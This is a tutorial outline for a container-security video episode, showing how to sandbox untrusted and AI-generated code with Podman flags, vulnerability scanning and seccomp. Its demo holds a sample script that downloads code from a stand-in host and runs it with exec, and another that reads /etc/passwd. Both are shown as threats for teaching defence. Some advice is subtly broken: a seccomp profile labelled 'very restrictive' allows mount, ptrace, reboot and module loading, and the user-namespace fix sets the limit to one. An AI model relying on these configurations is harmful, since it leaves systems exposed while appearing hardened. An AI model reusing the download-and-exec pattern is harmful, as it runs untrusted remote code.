# Episode 000: Container Defense - Your Security Sandbox Against Malicious Code

**Duration:** 20-25 minutes  
**Difficulty:** Beginner to Intermediate  
**Technologies:** Podman, Docker, Security scanners, User namespaces, SELinux

## Episode Overview

In an era where AI-generated code, malicious dependencies, and supply chain
attacks are becoming common, containers provide the perfect defense mechanism.
This episode demonstrates how to use containers as security sandboxes to safely
evaluate untrusted code, isolate potentially malicious dependencies, and protect
your development environment from threats - including code generated by AI
assistants like Claude Code.

**Why Episode Zero?** Security should be your foundation, not an afterthought.

## Prerequisites

- [ ] Linux system (or Linux VM) - containers are your security boundary
- [ ] Podman or Docker installed (we'll focus on Podman for security)
- [ ] Basic understanding of command line
- [ ] Healthy paranoia about running untrusted code

## Episode Outline

### Introduction (0:00 - 3:00)

- Welcome to ContainerCodes - Security First!
- The new threat landscape: AI code, supply chain attacks, malicious
  dependencies
- Why containers are your best defense mechanism
- Episode overview: Practical security through isolation

### Section 1: The Threat Landscape (3:00 - 8:00)

- AI-generated code risks (hallucinated vulnerabilities, backdoors)
- Supply chain attacks in package managers (npm, pip, cargo, etc.)
- Malicious dependencies and typosquatting
- Zero-day vulnerabilities in legitimate packages
- Real-world examples and recent incidents

### Section 2: Container Security Fundamentals (8:00 - 12:00)

- Containers as security boundaries
- Rootless containers and user namespaces
- Resource limits and denial-of-service protection
- Network isolation and egress filtering
- Filesystem isolation and read-only mounts

### Section 3: Practical Defense Scenarios (12:00 - 20:00)

#### Scenario 1: Testing AI-Generated Code Safely

- Isolating potentially harmful code snippets
- Limiting network access and filesystem access
- Monitoring resource usage and behavior

#### Scenario 2: Dependency Vulnerability Scanning

- Scanning container images for vulnerabilities
- Testing packages in isolated environments
- Automated security scanning workflows

#### Scenario 3: Secure Development Environments

- Containerized development environments
- Separating projects with different trust levels
- Emergency containment and cleanup

### Section 4: Advanced Defense Techniques (20:00 - 23:00)

- AppArmor and SELinux profiles for containers
- Seccomp profiles for system call filtering
- Runtime security monitoring
- Air-gapped container environments

### Wrap-up (23:00 - 25:00)

- Key security principles for container use
- Building security habits into development workflow
- Preview: Episode 1 - Container internals deep dive
- Community challenge: Secure your development environment

## Demo Commands

### Section 1: Threat Demonstration

```bash
# Example of potentially dangerous AI-generated code
# (Safe demonstration - we'll show what NOT to do)
cat << 'EOF' > suspicious_script.py
#!/usr/bin/env python3
import subprocess
import urllib.request

# AI might generate code like this without proper security consideration
def download_and_execute(url):
    response = urllib.request.urlopen(url)
    code = response.read().decode('utf-8')
    exec(code)  # DANGEROUS: Never do this!

# This could be malicious
download_and_execute("https://example.com/malicious_payload.py")
EOF

echo "‚ùå NEVER run untrusted code directly on your host system!"
```

### Section 2: Container Security Setup

```bash
# Create a secure container environment
podman run -it --rm \
    --security-opt no-new-privileges \
    --cap-drop ALL \
    --cap-add SETGID \
    --cap-add SETUID \
    --read-only \
    --tmpfs /tmp:rw,noexec,nosuid,size=100m \
    --network none \
    --memory 512m \
    --cpus 0.5 \
    python:3.11-alpine /bin/sh

# Inside container: Show isolation
whoami  # root inside, but unprivileged outside
mount | grep -E "(proc|sys|tmp)"  # Limited filesystem access
```

### Section 3: Practical Defense Scenarios

#### Scenario 1: AI Code Testing

```bash
# Create isolated environment for testing AI-generated code
mkdir -p ~/container-defense/ai-code-test
cd ~/container-defense/ai-code-test

# Create potentially suspicious AI-generated code
cat << 'EOF' > ai_generated.py
#!/usr/bin/env python3
# AI-generated code that might have security issues
import os
import socket
import subprocess

def system_info():
    # This looks innocent but could be doing more
    hostname = socket.gethostname()
    user = os.getenv('USER', 'unknown')

    # Potentially suspicious: trying to execute system commands
    try:
        result = subprocess.run(['whoami'], capture_output=True, text=True)
        current_user = result.stdout.strip()
    except:
        current_user = 'unknown'

    # Potentially suspicious: trying to read sensitive files
    try:
        with open('/etc/passwd', 'r') as f:
            passwd_lines = len(f.readlines())
    except:
        passwd_lines = 0

    print(f"Host: {hostname}, User: {user}, Current: {current_user}")
    print(f"System has {passwd_lines} user entries")

    # This could be exfiltrating data
    return {"hostname": hostname, "user": user, "passwd_count": passwd_lines}

if __name__ == "__main__":
    info = system_info()
    print("System analysis complete:", info)
EOF

# Test this code in a secure container
echo "üõ°Ô∏è Testing AI-generated code in secure container..."
podman run -it --rm \
    --security-opt no-new-privileges \
    --cap-drop ALL \
    --read-only \
    --tmpfs /app:rw,noexec,nosuid,size=50m \
    --network none \
    --memory 256m \
    --cpus 0.25 \
    -v $(pwd)/ai_generated.py:/app/test.py:ro \
    python:3.11-alpine python /app/test.py

echo "‚úÖ Code tested safely - no host system access!"
```

#### Scenario 2: Dependency Scanning

```bash
# Create a test project with potentially vulnerable dependencies
mkdir -p ~/container-defense/dependency-test
cd ~/container-defense/dependency-test

# Create a requirements.txt with mixed legitimate and potentially risky packages
cat << 'EOF' > requirements.txt
requests==2.31.0
flask==2.3.3
urllib3==1.26.18  # Known to have security issues in older versions
pillow==9.5.0     # Image processing library - frequent CVEs
jinja2==3.1.2
pyyaml==6.0.1
EOF

# Scan for vulnerabilities before installation
echo "üîç Scanning dependencies for vulnerabilities..."
podman run --rm \
    -v $(pwd):/app:ro \
    -w /app \
    aquasec/trivy:latest \
    fs --security-checks vuln /app

# Install and test dependencies in isolated environment
echo "üß™ Testing dependencies in isolated container..."
podman run -it --rm \
    --security-opt no-new-privileges \
    --cap-drop ALL \
    --network none \
    --memory 512m \
    --tmpfs /app:rw,size=200m \
    -v $(pwd)/requirements.txt:/app/requirements.txt:ro \
    python:3.11-alpine sh -c "
    cd /app
    pip install -r requirements.txt
    python -c 'import requests; print(f\"Requests version: {requests.__version__}\")'
    python -c 'import flask; print(f\"Flask version: {flask.__version__}\")'
    echo 'Dependencies tested safely in isolation'
    "
```

#### Scenario 3: Secure Development Environment

```bash
# Create a containerized development environment
echo "üèóÔ∏è Creating secure development environment..."

# Development container with limited host access
podman run -it --rm \
    --name secure-dev-env \
    --security-opt no-new-privileges \
    --cap-drop ALL \
    --cap-add SETGID \
    --cap-add SETUID \
    --memory 2g \
    --cpus 1.0 \
    --tmpfs /tmp:rw,noexec,nosuid,size=500m \
    -v ~/container-defense:/workspace:Z \
    -w /workspace \
    --hostname secure-container \
    python:3.11-alpine sh -c "
    apk add --no-cache git vim curl
    adduser -D -s /bin/sh developer
    su developer
    echo 'üîí Secure development environment ready!'
    echo 'Host filesystem access limited to workspace directory'
    echo 'Network access available but can be restricted as needed'
    /bin/sh
    "
```

### Section 4: Advanced Security

```bash
# Example of SELinux/AppArmor integration (distribution dependent)
# Check if SELinux is enabled
if command -v getenforce >/dev/null 2>&1; then
    echo "SELinux status: $(getenforce)"
    # Run container with SELinux label
    podman run --rm --security-opt label=type:container_t alpine echo "SELinux confined container"
fi

# Create custom seccomp profile (advanced)
cat << 'EOF' > seccomp-profile.json
{
    "defaultAction": "SCMP_ACT_ERRNO",
    "architectures": ["SCMP_ARCH_X86_64"],
    "syscalls": [
        {
            "names": [
                "read", "write", "open", "close", "stat", "fstat", "lstat",
                "poll", "lseek", "mmap", "mprotect", "munmap", "brk",
                "rt_sigaction", "rt_sigprocmask", "rt_sigreturn", "ioctl",
                "pread64", "pwrite64", "readv", "writev", "access", "pipe",
                "select", "sched_yield", "mremap", "msync", "mincore",
                "madvise", "shmget", "shmat", "shmctl", "dup", "dup2",
                "pause", "nanosleep", "getitimer", "alarm", "setitimer",
                "getpid", "sendfile", "socket", "connect", "accept", "sendto",
                "recvfrom", "sendmsg", "recvmsg", "shutdown", "bind", "listen",
                "getsockname", "getpeername", "socketpair", "setsockopt",
                "getsockopt", "clone", "fork", "vfork", "execve", "exit",
                "wait4", "kill", "uname", "semget", "semop", "semctl", "shmdt",
                "msgget", "msgsnd", "msgrcv", "msgctl", "fcntl", "flock",
                "fsync", "fdatasync", "truncate", "ftruncate", "getdents",
                "getcwd", "chdir", "fchdir", "rename", "mkdir", "rmdir",
                "creat", "link", "unlink", "symlink", "readlink", "chmod",
                "fchmod", "chown", "fchown", "lchown", "umask", "gettimeofday",
                "getrlimit", "getrusage", "sysinfo", "times", "ptrace",
                "getuid", "syslog", "getgid", "setuid", "setgid", "geteuid",
                "getegid", "setpgid", "getppid", "getpgrp", "setsid",
                "setreuid", "setregid", "getgroups", "setgroups", "setresuid",
                "getresuid", "setresgid", "getresgid", "getpgid", "setfsuid",
                "setfsgid", "getsid", "capget", "capset", "rt_sigpending",
                "rt_sigtimedwait", "rt_sigqueueinfo", "rt_sigsuspend",
                "sigaltstack", "utime", "mknod", "uselib", "personality",
                "ustat", "statfs", "fstatfs", "sysfs", "getpriority",
                "setpriority", "sched_setparam", "sched_getparam",
                "sched_setscheduler", "sched_getscheduler", "sched_get_priority_max",
                "sched_get_priority_min", "sched_rr_get_interval", "mlock",
                "munlock", "mlockall", "munlockall", "vhangup", "modify_ldt",
                "pivot_root", "prctl", "arch_prctl", "adjtimex", "setrlimit",
                "chroot", "sync", "acct", "settimeofday", "mount", "umount2",
                "swapon", "swapoff", "reboot", "sethostname", "setdomainname",
                "iopl", "ioperm", "create_module", "init_module", "delete_module",
                "get_kernel_syms", "query_module", "quotactl", "nfsservctl",
                "getpmsg", "putpmsg", "afs_syscall", "tuxcall", "security",
                "gettid", "readahead", "setxattr", "lsetxattr", "fsetxattr",
                "getxattr", "lgetxattr", "fgetxattr", "listxattr", "llistxattr",
                "flistxattr", "removexattr", "lremovexattr", "fremovexattr",
                "tkill", "time", "futex", "sched_setaffinity", "sched_getaffinity",
                "set_thread_area", "io_setup", "io_destroy", "io_getevents",
                "io_submit", "io_cancel", "get_thread_area", "lookup_dcookie",
                "epoll_create", "epoll_ctl_old", "epoll_wait_old", "remap_file_pages",
                "getdents64", "set_tid_address", "restart_syscall", "semtimedop",
                "fadvise64", "timer_create", "timer_settime", "timer_gettime",
                "timer_getoverrun", "timer_delete", "clock_settime", "clock_gettime",
                "clock_getres", "clock_nanosleep", "exit_group", "epoll_wait",
                "epoll_ctl", "tgkill", "utimes", "vserver", "mbind", "set_mempolicy",
                "get_mempolicy", "mq_open", "mq_unlink", "mq_timedsend",
                "mq_timedreceive", "mq_notify", "mq_getsetattr", "kexec_load",
                "waitid", "add_key", "request_key", "keyctl", "ioprio_set",
                "ioprio_get", "inotify_init", "inotify_add_watch", "inotify_rm_watch",
                "migrate_pages", "openat", "mkdirat", "mknodat", "fchownat",
                "futimesat", "newfstatat", "unlinkat", "renameat", "linkat",
                "symlinkat", "readlinkat", "fchmodat", "faccessat", "pselect6",
                "ppoll", "unshare", "set_robust_list", "get_robust_list",
                "splice", "tee", "sync_file_range", "vmsplice", "move_pages",
                "utimensat", "epoll_pwait", "signalfd", "timerfd_create",
                "eventfd", "fallocate", "timerfd_settime", "timerfd_gettime",
                "accept4", "signalfd4", "eventfd2", "epoll_create1", "dup3",
                "pipe2", "inotify_init1", "preadv", "pwritev", "rt_tgsigqueueinfo",
                "perf_event_open", "recvmmsg", "fanotify_init", "fanotify_mark",
                "prlimit64", "name_to_handle_at", "open_by_handle_at", "clock_adjtime",
                "syncfs", "sendmmsg", "setns", "getcpu", "process_vm_readv",
                "process_vm_writev", "kcmp", "finit_module"
            ],
            "action": "SCMP_ACT_ALLOW"
        }
    ]
}
EOF

# Run container with custom seccomp profile (very restrictive)
echo "üîí Running container with restrictive seccomp profile..."
podman run --rm \
    --security-opt seccomp=seccomp-profile.json \
    --security-opt no-new-privileges \
    --cap-drop ALL \
    alpine echo "Seccomp-restricted container running"
```

## Key Takeaways

- [ ] **Never trust, always verify** - Container isolation lets you safely test
      untrusted code
- [ ] **Rootless by default** - User namespaces provide crucial security
      boundaries
- [ ] **Principle of least privilege** - Drop all capabilities, add only what's
      needed
- [ ] **Resource limits prevent DoS** - Memory and CPU limits protect your
      system
- [ ] **Network isolation** - Default to no network, add connectivity only when
      required
- [ ] **Read-only filesystems** - Prevent malicious code from persisting changes
- [ ] **Vulnerability scanning** - Always scan dependencies before use
- [ ] **Defense in depth** - Combine multiple security mechanisms

## Resources and Links

### Container Security

- **[NIST Container Security Guide](https://csrc.nist.gov/publications/detail/sp/800-190/final)** -
  Official security guidelines
- **[CIS Container Benchmarks](https://www.cisecurity.org/benchmark/docker)** -
  Security configuration standards
- **[Rootless Containers](https://rootlesscontaine.rs/)** - Comprehensive
  rootless container guide

### Vulnerability Scanning

- **[Trivy](https://github.com/aquasecurity/trivy)** - Comprehensive
  vulnerability scanner
- **[Clair](https://github.com/quay/clair)** - Container vulnerability analysis
- **[Grype](https://github.com/anchore/grype)** - Container image vulnerability
  scanner

### AI Code Security

- **[OWASP AI Security](https://owasp.org/www-project-ai-security-and-privacy-guide/)** -
  AI security guidelines
- **[Supply Chain Security](https://slsa.dev/)** - Supply-chain Levels for
  Software Artifacts

### System Security

- **[SELinux User Guide](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/using_selinux/)** -
  SELinux container security
- **[Seccomp Tutorial](https://docs.docker.com/engine/security/seccomp/)** -
  System call filtering

## Viewer Questions

### Common Questions

**Q:** Can containers really protect against all malicious code?  
**A:** Containers provide strong isolation, but they're not perfect. They're one
layer in a defense-in-depth strategy. Always combine container isolation with
other security measures.

**Q:** Should I trust AI-generated code in containers?  
**A:** Container isolation is perfect for testing AI code safely, but you should
still review the code for logic errors, security issues, and compliance with
your requirements.

**Q:** What about Docker vs Podman for security?  
**A:** Podman's rootless, daemonless architecture provides better security
defaults. We'll cover this in detail in Episode 2.

### Follow-up Topics

- Container runtime security monitoring
- Supply chain security for container images
- Kubernetes security policies and admission controllers
- Building minimal, secure container images

## Technical Notes

### Environment Setup

```bash
# Install required tools
sudo dnf install podman buildah skopeo  # Fedora/RHEL
sudo apt install podman buildah skopeo  # Ubuntu

# Enable user namespaces (if not enabled)
echo 1 | sudo tee /proc/sys/user/max_user_namespaces

# Install vulnerability scanners
# Trivy
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# Create demo directory
mkdir -p ~/container-defense/{ai-code-test,dependency-test,dev-env}
```

### Security Test Scenarios

```bash
# Test 1: Resource exhaustion protection
echo "Testing memory limits..."
podman run --rm --memory=100m alpine sh -c '
    echo "Attempting to allocate 200MB in 100MB container..."
    python3 -c "
import sys
try:
    data = [0] * (200 * 1024 * 1024 // 8)  # Try to allocate 200MB
    print(\"Allocation successful - this should not happen!\")
except MemoryError:
    print(\"Memory allocation blocked by container limits - GOOD!\")
except Exception as e:
    print(f\"Container protection worked: {e}\")
    "
'

# Test 2: Network isolation
echo "Testing network isolation..."
podman run --rm --network=none alpine sh -c '
    echo "Attempting network connection..."
    wget -q --timeout=5 -O- http://httpbin.org/ip 2>&1 || echo "Network access blocked - GOOD!"
'

# Test 3: Filesystem protection
echo "Testing filesystem protection..."
podman run --rm --read-only --tmpfs /tmp alpine sh -c '
    echo "Attempting to write to root filesystem..."
    echo "malicious data" > /etc/malicious 2>&1 || echo "Write blocked - GOOD!"
    echo "Attempting to write to /tmp..."
    echo "test data" > /tmp/test && echo "Tmpfs write allowed - EXPECTED"
'
```

### Cleanup

```bash
# Stop all containers
podman stop --all
podman container prune -f

# Remove demo files
rm -rf ~/container-defense

# Remove custom seccomp profile
rm -f seccomp-profile.json

# Clean up images (optional)
podman image prune -f
```

### Troubleshooting

**Issue: User namespaces not available**  
**Solution:** Enable with `echo 1 | sudo tee /proc/sys/user/max_user_namespaces`

**Issue: SELinux prevents container access**  
**Solution:** Use `:Z` flag on volumes or adjust SELinux contexts

**Issue: Container exits immediately**  
**Solution:** Check resource limits aren't too restrictive

**Issue: Vulnerability scanner not finding issues**  
**Solution:** Test with known vulnerable images like `vulnerables/web-dvwa`
